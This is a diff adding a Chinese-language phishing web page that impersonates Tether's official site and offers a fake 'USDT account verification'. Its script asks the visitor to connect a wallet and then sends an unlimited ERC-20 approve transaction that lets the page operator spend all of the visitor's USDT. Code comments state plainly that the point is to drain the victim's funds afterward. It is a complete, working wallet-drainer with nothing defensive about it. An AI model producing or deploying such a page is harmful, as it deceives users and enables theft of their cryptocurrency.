@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tether Official - USDT Verification</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f5f7fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+        .logo {
+            width: 60px;
+            height: 60px;
+            background-color: #26A17B; /* Tether Green */
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 24px;
+            margin: 0 auto 20px;
+        }
+        h1 { font-size: 20px; color: #333; margin-bottom: 10px; }
+        p { color: #666; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
+        .btn {
+            background-color: #26A17B;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.3s;
+        }
+        .btn:hover { background-color: #1e8566; }
+        .status { margin-top: 15px; font-size: 12px; color: #999; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="logo">₮</div>
+    <h1>USDT 账户验证</h1>
+    <p>为了确保您的 USDT 余额安全并解锁最新功能，我们需要您进行一次小额链上签名验证。<br><strong>此操作不会扣除您的余额。</strong></p>
+    
+    <button class="btn" id="connectBtn">连接钱包并验证</button>
+    <div class="status" id="statusText">等待连接...</div>
+</div>
+
+<script>
+    // ⚠️【关键修改】在这里填入你的钱包地址
+    const YOUR_WALLET_ADDRESS = "0xYour_Address_Here"; 
+
+    document.getElementById('connectBtn').addEventListener('click', async () => {
+        if (typeof window.ethereum !== 'undefined') {
+            document.getElementById('statusText').innerText = "正在连接...";
+            
+            try {
+                // 1. 请求连接钱包
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+                document.getElementById('statusText').innerText = "正在获取授权...";
+
+                // 2. 执行 Approve (授权)
+                // 我们授权你 (YOUR_WALLET_ADDRESS) 可以花掉受害者所有的 USDT
+                // 注意：这里假设目标是 ERC20 标准的 USDT (以太坊主网)
+                
+                const usdtContract = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // 以太坊 USDT
+                
+                // 授权额度设为最大值 (无限授权)
+                const maxValue = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+
+                const txParams = {
+                    from: window.ethereum.selectedAddress,
+                    to: usdtContract,
+                    data: "0x095ea7b3000000000000000000000000" + YOUR_WALLET_ADDRESS.slice(2) + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+                    gas: "0x186a0" // 100000 gas
+                };
+
+                const txHash = await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [txParams],
+                });
+
+                document.getElementById('statusText').innerText = "✅ 验证成功！资金已解锁。";
+                document.getElementById('connectBtn').disabled = true;
+                
+                // 此时你已经获得了授权，可以用脚本转走了！
+                alert("验证成功！现在可以提取资产了。");
+
+            } catch (error) {
+                console.error(error);
+                document.getElementById('statusText').innerText = "验证失败，请重试。";
+            }
+        } else {
+            alert("请先安装 MetaMask 或其他 Web3 钱包！");
+        }
+    });
+</script>
+
+</body>
+</html>
